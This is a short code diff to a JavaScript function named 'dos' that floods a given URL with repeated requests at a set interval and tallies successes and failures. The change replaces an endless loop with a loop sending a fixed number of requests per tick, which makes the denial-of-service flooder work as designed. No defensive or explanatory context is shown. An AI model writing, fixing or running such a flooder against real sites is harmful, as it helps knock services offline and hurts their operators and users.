@@ -5,13 +5,12 @@ const dos = (url, qty, ms) => {
 
     setInterval(_ => {
 
-        while(true){
+        for (let i = qty; i--;)
             req(url, error => !error ? ok++ : err++)
 
-            console.log(`result:' ${ ok } ${ err }`)
+        console.log(`result:' ${ ok } ${ err }`)
 
-            err = ok = 0
-        }
+        err = ok = 0
 
     }, ms)
 }
